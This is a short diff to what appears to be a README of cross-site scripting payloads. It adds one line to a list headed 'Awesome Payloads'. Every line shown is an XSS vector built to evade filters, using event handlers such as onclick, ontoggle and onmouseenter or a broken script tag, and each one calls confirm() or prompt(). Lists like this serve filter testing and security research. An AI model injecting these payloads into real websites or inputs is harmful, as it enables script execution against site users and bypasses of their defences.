@@ -30,6 +30,7 @@ Put this repo on watch. I will be updating it regularly.
 ### Awesome Payloads
 ```
 <d3"<"/onclick="1>[confirm``]"<">z
+<d3/onmouseenter=[2].find(confirm)>z
 <details open ontoggle=confirm()>
 <script y="><">/*<script* */prompt()</script
 <w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
